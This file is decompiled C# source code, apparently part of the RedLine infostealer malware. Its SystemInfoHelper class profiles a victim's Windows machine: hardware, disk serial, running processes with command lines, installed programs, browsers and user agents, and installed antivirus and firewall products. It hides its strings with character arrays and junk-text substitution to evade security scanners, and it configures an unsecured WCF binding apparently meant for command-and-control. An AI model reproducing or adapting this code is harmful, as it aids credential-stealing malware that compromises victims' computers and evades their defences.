using System;
using System.Collections;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Management;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.ServiceModel;
using System.ServiceModel.Channels;
using System.Text.RegularExpressions;
using System.Windows.Forms;
using System.Xml;
using Microsoft.Win32;
using RedLine.Reburn.Data.Extensions;
using RedLine.Reburn.Models.Info;
using RedLine.Reburn.Models.WMI;

namespace RedLine.Reburn.Data.Helpers;

public static class SystemInfoHelper
{
	[DllImport("kernel32.dll", SetLastError = true)]
	[return: MarshalAs(UnmanagedType.Bool)]
	private static extern bool IsWow64Process([In] IntPtr hProcess, out bool lpSystemInfo);

	public static BasicHttpBinding CreateBind()
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0005: Unknown result type (might be due to invalid IL or missing references)
		//IL_0010: Unknown result type (might be due to invalid IL or missing references)
		//IL_001f: Unknown result type (might be due to invalid IL or missing references)
		//IL_002e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0042: Unknown result type (might be due to invalid IL or missing references)
		//IL_0056: Unknown result type (might be due to invalid IL or missing references)
		//IL_006a: Unknown result type (might be due to invalid IL or missing references)
		//IL_007e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0085: Unknown result type (might be due to invalid IL or missing references)
		//IL_008c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0093: Unknown result type (might be due to invalid IL or missing references)
		//IL_0094: Unknown result type (might be due to invalid IL or missing references)
		//IL_0099: Unknown result type (might be due to invalid IL or missing references)
		//IL_00a4: Unknown result type (might be due to invalid IL or missing references)
		//IL_00af: Unknown result type (might be due to invalid IL or missing references)
		//IL_00ba: Unknown result type (might be due to invalid IL or missing references)
		//IL_00c5: Unknown result type (might be due to invalid IL or missing references)
		//IL_00d5: Expected O, but got Unknown
		//IL_00d5: Unknown result type (might be due to invalid IL or missing references)
		//IL_00d6: Unknown result type (might be due to invalid IL or missing references)
		//IL_00db: Unknown result type (might be due to invalid IL or missing references)
		//IL_00e7: Expected O, but got Unknown
		//IL_00e8: Expected O, but got Unknown
		BasicHttpBinding val = new BasicHttpBinding();
		val.set_MaxBufferSize(int.MaxValue);
		val.set_MaxReceivedMessageSize(2147483647L);
		val.set_MaxBufferPoolSize(2147483647L);
		((Binding)val).set_CloseTimeout(TimeSpan.FromMinutes(30.0));
		((Binding)val).set_OpenTimeout(TimeSpan.FromMinutes(30.0));
		((Binding)val).set_ReceiveTimeout(TimeSpan.FromMinutes(30.0));
		((Binding)val).set_SendTimeout(TimeSpan.FromMinutes(30.0));
		val.set_TransferMode((TransferMode)0);
		val.set_UseDefaultWebProxy(false);
		val.set_ProxyAddress((Uri)null);
		XmlDictionaryReaderQuotas val2 = new XmlDictionaryReaderQuotas();
		val2.set_MaxDepth(44567654);
		val2.set_MaxArrayLength(int.MaxValue);
		val2.set_MaxBytesPerRead(int.MaxValue);
		val2.set_MaxNameTableCharCount(int.MaxValue);
		val2.set_MaxStringContentLength(int.MaxValue);
		val.set_ReaderQuotas(val2);
		BasicHttpSecurity val3 = new BasicHttpSecurity();
		val3.set_Mode((BasicHttpSecurityMode)0);
		val.set_Security(val3);
		return val;
	}

	private static bool Is64Bit()
	{
		IsWow64Process(Process.GetCurrentProcess().Handle, out var lpSystemInfo);
		return lpSystemInfo;
	}

	public static List<WmiProcessor> GetProcessors()
	{
		//IL_000b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0011: Expected O, but got Unknown
		//IL_0028: Unknown result type (might be due to invalid IL or missing references)
		//IL_002f: Expected O, but got Unknown
		List<WmiProcessor> list = new List<WmiProcessor>();
		try
		{
			ManagementObjectSearcher val = new ManagementObjectSearcher("SELECT * FROM Win32_Processor");
			try
			{
				ManagementObjectCollection val2 = val.Get();
				try
				{
					ManagementObjectEnumerator enumerator = val2.GetEnumerator();
					try
					{
						while (enumerator.MoveNext())
						{
							ManagementObject val3 = (ManagementObject)enumerator.get_Current();
							try
							{
								list.Add(new WmiProcessor
								{
									Name = (((ManagementBaseObject)val3).get_Item("Name") as string),
									NumberOfCores = Convert.ToInt32(((ManagementBaseObject)val3).get_Item("NumberOfCores"))
								});
							}
							catch
							{
							}
						}
						return list;
					}
					finally
					{
						((IDisposable)enumerator)?.Dispose();
					}
				}
				finally
				{
					((IDisposable)val2)?.Dispose();
				}
			}
			finally
			{
				((IDisposable)val)?.Dispose();
			}
		}
		catch
		{
			return list;
		}
	}

	public static List<WmiGraphicCard> GetGraphicCards()
	{
		//IL_000b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0011: Expected O, but got Unknown
		//IL_0028: Unknown result type (might be due to invalid IL or missing references)
		//IL_002f: Expected O, but got Unknown
		List<WmiGraphicCard> list = new List<WmiGraphicCard>();
		try
		{
			ManagementObjectSearcher val = new ManagementObjectSearcher("SELECT * FROM Win32_VideoController");
			try
			{
				ManagementObjectCollection val2 = val.Get();
				try
				{
					ManagementObjectEnumerator enumerator = val2.GetEnumerator();
					try
					{
						while (enumerator.MoveNext())
						{
							ManagementObject val3 = (ManagementObject)enumerator.get_Current();
							try
							{
								list.Add(new WmiGraphicCard
								{
									Name = (((ManagementBaseObject)val3).get_Item("Name") as string),
									AdapterRAM = Convert.ToUInt32(((ManagementBaseObject)val3).get_Item("AdapterRAM"))
								});
							}
							catch
							{
							}
						}
						return list;
					}
					finally
					{
						((IDisposable)enumerator)?.Dispose();
					}
				}
				finally
				{
					((IDisposable)val2)?.Dispose();
				}
			}
			finally
			{
				((IDisposable)val)?.Dispose();
			}
		}
		catch (Exception)
		{
			return list;
		}
	}

	public static List<string> SystemDefenders()
	{
		//IL_0090: Unknown result type (might be due to invalid IL or missing references)
		//IL_0097: Expected O, but got Unknown
		//IL_00b3: Unknown result type (might be due to invalid IL or missing references)
		//IL_00ba: Expected O, but got Unknown
		List<string> list = new List<string>();
		try
		{
			string[] array = new string[2] { "ROwindows defender sucksOT\\SecurityCentewindows defender sucksr2", "ROwindows defender sucksOT\\Securwindows defender sucksityCenter" };
			string[] array2 = new string[3] { "AntiviruAVOID WACATACsProduct", "AntiSpAVOID WACATACyWareProAVOID WACATACuct", "FAVOID WACATACirewaAVOID WACATACllProduct" };
			foreach (string text in array2)
			{
				string[] array3 = array;
				foreach (string text2 in array3)
				{
					try
					{
						ManagementObjectSearcher val = new ManagementObjectSearcher(text2.Replace("windows defender sucks", string.Empty), "SELECT * FROM " + text.Replace("AVOID WACATAC", string.Empty));
						try
						{
							ManagementObjectCollection val2 = val.Get();
							try
							{
								ManagementObjectEnumerator enumerator = val2.GetEnumerator();
								try
								{
									while (enumerator.MoveNext())
									{
										ManagementObject val3 = (ManagementObject)enumerator.get_Current();
										try
										{
											if (!list.Contains(((ManagementBaseObject)val3).get_Item(new string(new char[11]
											{
												'd', 'i', 's', 'p', 'l', 'a', 'y', 'N', 'a', 'm',
												'e'
											})) as string))
											{
												list.Add(((ManagementBaseObject)val3).get_Item(new string(new char[11]
												{
													'd', 'i', 's', 'p', 'l', 'a', 'y', 'N', 'a', 'm',
													'e'
												})) as string);
											}
										}
										catch
										{
										}
									}
								}
								finally
								{
									((IDisposable)enumerator)?.Dispose();
								}
							}
							finally
							{
								((IDisposable)val2)?.Dispose();
							}
						}
						finally
						{
							((IDisposable)val)?.Dispose();
						}
					}
					catch
					{
					}
				}
			}
			return list;
		}
		catch (Exception)
		{
			return list;
		}
	}

	public static List<InstalledBrowserInfo> GetBrowsers()
	{
		List<InstalledBrowserInfo> list = new List<InstalledBrowserInfo>();
		try
		{
			RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\\WOW6432Node\\Clients\\StartMenuInternet");
			if (registryKey == null)
			{
				registryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Clients\\StartMenuInternet");
			}
			string[] subKeyNames = registryKey.GetSubKeyNames();
			for (int i = 0; i < subKeyNames.Length; i++)
			{
				InstalledBrowserInfo installedBrowserInfo = new InstalledBrowserInfo();
				RegistryKey registryKey2 = registryKey.OpenSubKey(subKeyNames[i]);
				installedBrowserInfo.Name = (string)registryKey2.GetValue(null);
				RegistryKey registryKey3 = registryKey2.OpenSubKey("shell\\open\\command");
				installedBrowserInfo.Path = registryKey3.GetValue(null)!.ToString().StripQuotes();
				if (installedBrowserInfo.Path != null)
				{
					installedBrowserInfo.Version = FileVersionInfo.GetVersionInfo(installedBrowserInfo.Path).FileVersion;
				}
				else
				{
					installedBrowserInfo.Version = "Unknown Version";
				}
				list.Add(installedBrowserInfo);
			}
			InstalledBrowserInfo edgeVersion = GetEdgeVersion();
			if (edgeVersion != null)
			{
				list.Add(edgeVersion);
				return list;
			}
			return list;
		}
		catch
		{
			return list;
		}
	}

	private static InstalledBrowserInfo GetEdgeVersion()
	{
		RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Classes\\Local Settings\\Software\\Microsoft\\Windows\\CurrentVersion\\AppModel\\SystemAppData\\Microsoft.MicrosoftEdge_8wekyb3d8bbwe\\Schemas");
		if (registryKey != null)
		{
			Match match = Regex.Match(registryKey.GetValue("PackageFullName")!.ToString().StripQuotes(), "(((([0-9.])\\d)+){1})");
			if (match.Success)
			{
				return new InstalledBrowserInfo
				{
					Name = "MicrosoftEdge",
					Version = match.Value
				};
			}
		}
		return null;
	}

	public static WmiDiskDrive GetDiskDrive()
	{
		//IL_000b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0011: Expected O, but got Unknown
		//IL_0028: Unknown result type (might be due to invalid IL or missing references)
		//IL_002f: Expected O, but got Unknown
		WmiDiskDrive wmiDiskDrive = new WmiDiskDrive();
		try
		{
			ManagementObjectSearcher val = new ManagementObjectSearcher("SELECT * FROM Win32_DiskDrive");
			try
			{
				ManagementObjectCollection val2 = val.Get();
				try
				{
					ManagementObjectEnumerator enumerator = val2.GetEnumerator();
					try
					{
						while (enumerator.MoveNext())
						{
							ManagementObject val3 = (ManagementObject)enumerator.get_Current();
							try
							{
								wmiDiskDrive.SerialNumber = ((ManagementBaseObject)val3).get_Item("SerialNumber") as string;
								return wmiDiskDrive;
							}
							catch
							{
							}
						}
						return wmiDiskDrive;
					}
					finally
					{
						((IDisposable)enumerator)?.Dispose();
					}
				}
				finally
				{
					((IDisposable)val2)?.Dispose();
				}
			}
			finally
			{
				((IDisposable)val)?.Dispose();
			}
		}
		catch
		{
			return wmiDiskDrive;
		}
	}

	public static List<string> ListOfProcesses()
	{
		//IL_0036: Unknown result type (might be due to invalid IL or missing references)
		//IL_003c: Expected O, but got Unknown
		//IL_0056: Unknown result type (might be due to invalid IL or missing references)
		//IL_005d: Expected O, but got Unknown
		List<string> list = new List<string>();
		try
		{
			ManagementObjectSearcher val = new ManagementObjectSearcher(new string(new char[45]
			{
				'S', 'E', 'L', 'E', 'C', 'T', ' ', '*', ' ', 'F',
				'R', 'O', 'M', ' ', 'W', 'i', 'n', '3', '2', '_',
				'P', 'r', 'o', 'c', 'e', 's', 's', ' ', 'W', 'h',
				'e', 'r', 'e', ' ', 'S', 'e', 's', 's', 'i', 'o',
				'n', 'I', 'd', '=', '\''
			}) + Process.GetCurrentProcess().SessionId + "'");
			try
			{
				ManagementObjectCollection val2 = val.Get();
				try
				{
					ManagementObjectEnumerator enumerator = val2.GetEnumerator();
					try
					{
						while (enumerator.MoveNext())
						{
							ManagementObject val3 = (ManagementObject)enumerator.get_Current();
							try
							{
								list.Add(new string(new char[4] { 'I', 'D', ':', ' ' }) + ((ManagementBaseObject)val3).get_Item(new string(new char[9] { 'P', 'r', 'o', 'c', 'e', 's', 's', 'I', 'd' }))?.ToString() + new string(new char[8] { ',', ' ', 'N', 'a', 'm', 'e', ':', ' ' }) + ((ManagementBaseObject)val3).get_Item(new string(new char[4] { 'N', 'a', 'm', 'e' }))?.ToString() + new string(new char[15]
								{
									',', ' ', 'C', 'o', 'm', 'm', 'a', 'n', 'd', 'L',
									'i', 'n', 'e', ':', ' '
								}) + ((ManagementBaseObject)val3).get_Item(new string(new char[11]
								{
									'C', 'o', 'm', 'm', 'a', 'n', 'd', 'L', 'i', 'n',
									'e'
								})));
							}
							catch
							{
							}
						}
						return list;
					}
					finally
					{
						((IDisposable)enumerator)?.Dispose();
					}
				}
				finally
				{
					((IDisposable)val2)?.Dispose();
				}
			}
			finally
			{
				((IDisposable)val)?.Dispose();
			}
		}
		catch
		{
			return list;
		}
	}

	public static List<string> ListOfPrograms()
	{
		List<string> list = new List<string>();
		try
		{
			string name = new string(new char[51]
			{
				'S', 'O', 'F', 'T', 'W', 'A', 'R', 'E', '\\', 'M',
				'i', 'c', 'r', 'o', 's', 'o', 'f', 't', '\\', 'W',
				'i', 'n', 'd', 'o', 'w', 's', '\\', 'C', 'u', 'r',
				'r', 'e', 'n', 't', 'V', 'e', 'r', 's', 'i', 'o',
				'n', '\\', 'U', 'n', 'i', 'n', 's', 't', 'a', 'l',
				'l'
			});
			using RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(name);
			string[] subKeyNames = registryKey.GetSubKeyNames();
			foreach (string name2 in subKeyNames)
			{
				using RegistryKey registryKey2 = registryKey.OpenSubKey(name2);
				string text = (string)registryKey2?.GetValue(new string(new char[11]
				{
					'D', 'i', 's', 'p', 'l', 'a', 'y', 'N', 'a', 'm',
					'e'
				}));
				string text2 = (string)registryKey2?.GetValue(new string(new char[14]
				{
					'D', 'i', 's', 'p', 'l', 'a', 'y', 'V', 'e', 'r',
					's', 'i', 'o', 'n'
				}));
				if (!string.IsNullOrEmpty(text))
				{
					list.Add(Regex.Replace(text + " [" + text2 + "]", new string(new char[16]
					{
						'[', '^', '\\', 'u', '0', '0', '2', '0', '-', '\\',
						'u', '0', '0', '7', 'F', ']'
					}), string.Empty));
				}
			}
		}
		catch
		{
		}
		return list.OrderBy((string x) => x).ToList();
	}

	public static List<string> AvailableLanguages()
	{
		List<string> result = new List<string>();
		try
		{
			return (from InputLanguage lang in (IEnumerable)InputLanguage.get_InstalledInputLanguages()
				select lang.get_Culture().EnglishName).ToList();
		}
		catch
		{
			return result;
		}
	}

	public static List<string> GetUserAgents(ClientSettings settings)
	{
		List<string> list = new List<string>();
		try
		{
			if (!settings.GrabUserAgent)
			{
				return list;
			}
			string text = (Is64Bit() ? "x64" : "x32");
			string osVersion = GetOsVersion();
			string empty = string.Empty;
			string[] array = osVersion.Split(new char[1] { '.' });
			string text2 = string.Empty;
			if (array.Contains("10"))
			{
				text2 = new string(new char[10] { 'W', 'i', 'n', 'd', 'o', 'w', 's', ' ', 'N', 'T' }) + " 10.0";
			}
			if (array.Length > 1 && !array.Contains("10"))
			{
				text2 = new string(new char[10] { 'W', 'i', 'n', 'd', 'o', 'w', 's', ' ', 'N', 'T' }) + " " + array[0] + "." + array[1];
			}
			if (Directory.Exists(Environment.GetEnvironmentVariable(new string(new char[12]
			{
				'L', 'o', 'c', 'a', 'l', 'A', 'p', 'p', 'D', 'a',
				't', 'a'
			})) + new string(new char[24]
			{
				'\\', 'G', 'o', 'o', 'g', 'l', 'e', '\\', 'C', 'h',
				'r', 'o', 'm', 'e', '\\', 'U', 's', 'e', 'r', ' ',
				'D', 'a', 't', 'a'
			})))
			{
				object value = Registry.GetValue(new string(new char[80]
				{
					'H', 'K', 'E', 'Y', '_', 'C', 'U', 'R', 'R', 'E',
					'N', 'T', '_', 'U', 'S', 'E', 'R', '\\', 'S', 'o',
					'f', 't', 'w', 'a', 'r', 'e', '\\', 'M', 'i', 'c',
					'r', 'o', 's', 'o', 'f', 't', '\\', 'W', 'i', 'n',
					'd', 'o', 'w', 's', '\\', 'C', 'u', 'r', 'r', 'e',
					'n', 't', 'V', 'e', 'r', 's', 'i', 'o', 'n', '\\',
					'A', 'p', 'p', ' ', 'P', 'a', 't', 'h', 's', '\\',
					'c', 'h', 'r', 'o', 'm', 'e', '.', 'e', 'x', 'e'
				}), "", null);
				object value2 = Registry.GetValue("HKEY_LOCAL_MACf4f42dHINE\\SOFTWf4f42dARE\\Microf4f42dsoft\\Wf4f42dindows\\CurrentVef4f42drsion\\App f4f42dPaths\\chromf4f42de.exe".Replace("f4f42d", string.Empty), "", null);
				empty = ((value == null) ? FileVersionInfo.GetVersionInfo(value2.ToString()).FileVersion : FileVersionInfo.GetVersionInfo(value.ToString()).FileVersion);
				if (text == new string(new char[3] { 'x', '6', '4' }))
				{
					list.Add(new string(new char[13]
					{
						'M', 'o', 'z', 'i', 'l', 'l', 'a', '/', '5', '.',
						'0', ' ', '('
					}) + text2 + new string(new char[60]
					{
						';', ' ', 'W', 'i', 'n', '6', '4', ';', ' ', 'x',
						'6', '4', ')', ' ', 'A', 'p', 'p', 'l', 'e', 'W',
						'e', 'b', 'K', 'i', 't', '/', '5', '3', '7', '.',
						'3', '6', ' ', '(', 'K', 'H', 'T', 'M', 'L', ',',
						' ', 'l', 'i', 'k', 'e', ' ', 'G', 'e', 'c', 'k',
						'o', ')', ' ', 'C', 'h', 'r', 'o', 'm', 'e', '/'
					}) + empty + new string(new char[14]
					{
						' ', 'S', 'a', 'f', 'a', 'r', 'i', '/', '5', '3',
						'7', '.', '3', '6'
					}));
					return list;
				}
				list.Add(new string(new char[13]
				{
					'M', 'o', 'z', 'i', 'l', 'l', 'a', '/', '5', '.',
					'0', ' ', '('
				}) + text2 + new string(new char[48]
				{
					')', ' ', 'A', 'p', 'p', 'l', 'e', 'W', 'e', 'b',
					'K', 'i', 't', '/', '5', '3', '7', '.', '3', '6',
					' ', '(', 'K', 'H', 'T', 'M', 'L', ',', ' ', 'l',
					'i', 'k', 'e', ' ', 'G', 'e', 'c', 'k', 'o', ')',
					' ', 'C', 'h', 'r', 'o', 'm', 'e', '/'
				}) + empty + new string(new char[14]
				{
					' ', 'S', 'a', 'f', 'a', 'r', 'i', '/', '5', '3',
					'7', '.', '3', '6'
				}));
				return list;
			}
			return list;
		}
		catch
		{
			return list;
		}
	}

	public static string TotalOfRAM()
	{
		//IL_000b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0011: Expected O, but got Unknown
		//IL_0028: Unknown result type (might be due to invalid IL or missing references)
		//IL_002f: Expected O, but got Unknown
		string result = "0 Mb or 0";
		try
		{
			ManagementObjectSearcher val = new ManagementObjectSearcher("SELECT * FROM Win32_OperatingSystem");
			try
			{
				ManagementObjectCollection val2 = val.Get();
				try
				{
					ManagementObjectEnumerator enumerator = val2.GetEnumerator();
					try
					{
						while (enumerator.MoveNext())
						{
							ManagementObject val3 = (ManagementObject)enumerator.get_Current();
							try
							{
								double num = Convert.ToDouble(((ManagementBaseObject)val3).get_Item("TotalVisibleMemorySize"));
								double num2 = num * 1024.0;
								double num3 = Math.Round(num / 1024.0, 2);
								result = $"{num3} MB or {num2}".Replace(",", ".");
							}
							catch
							{
							}
						}
						return result;
					}
					finally
					{
						((IDisposable)enumerator)?.Dispose();
					}
				}
				finally
				{
					((IDisposable)val2)?.Dispose();
				}
			}
			finally
			{
				((IDisposable)val)?.Dispose();
			}
		}
		catch
		{
			return result;
		}
	}

	public static string GetWindowsVersion()
	{
		try
		{
			string text;
			try
			{
				text = (Environment.Is64BitOperatingSystem ? "x64" : "x32");
			}
			catch (Exception)
			{
				text = "x86";
			}
			string text2 = smethod_0("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", "ProductName");
			smethod_0("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", "CSDVersion");
			if (!string.IsNullOrEmpty(text2))
			{
				return text2 + " " + text;
			}
		}
		catch
		{
		}
		return string.Empty;
	}

	public static string GetOsVersion()
	{
		//IL_001f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0038: Unknown result type (might be due to invalid IL or missing references)
		//IL_003e: Expected O, but got Unknown
		string result = string.Empty;
		try
		{
			ManagementObject val = null;
			ManagementObjectEnumerator enumerator = new ManagementClass(new string(new char[21]
			{
				'W', 'i', 'n', '3', '2', '_', 'O', 'p', 'e', 'r',
				'a', 't', 'i', 'n', 'g', 'S', 'y', 's', 't', 'e',
				'm'
			})).GetInstances().GetEnumerator();
			try
			{
				while (enumerator.MoveNext())
				{
					val = (ManagementObject)enumerator.get_Current();
					if (val != null)
					{
						break;
					}
				}
			}
			finally
			{
				((IDisposable)enumerator)?.Dispose();
			}
			if (val == null)
			{
				result = string.Empty;
				return result;
			}
			result = ((ManagementBaseObject)val).get_Item(new string(new char[7] { 'V', 'e', 'r', 's', 'i', 'o', 'n' })) as string;
			return result;
		}
		catch
		{
			return result;
		}
	}

	[CompilerGenerated]
	internal static string smethod_0(string key, string value)
	{
		try
		{
			RegistryKey? registryKey = Registry.LocalMachine.OpenSubKey(key);
			object obj;
			if (registryKey == null)
			{
				obj = null;
			}
			else
			{
				obj = registryKey!.GetValue(value)!.ToString();
				if (obj != null)
				{
					goto IL_0026;
				}
			}
			obj = string.Empty;
			goto IL_0026;
			IL_0026:
			return (string)obj;
		}
		catch
		{
			return string.Empty;
		}
	}
}
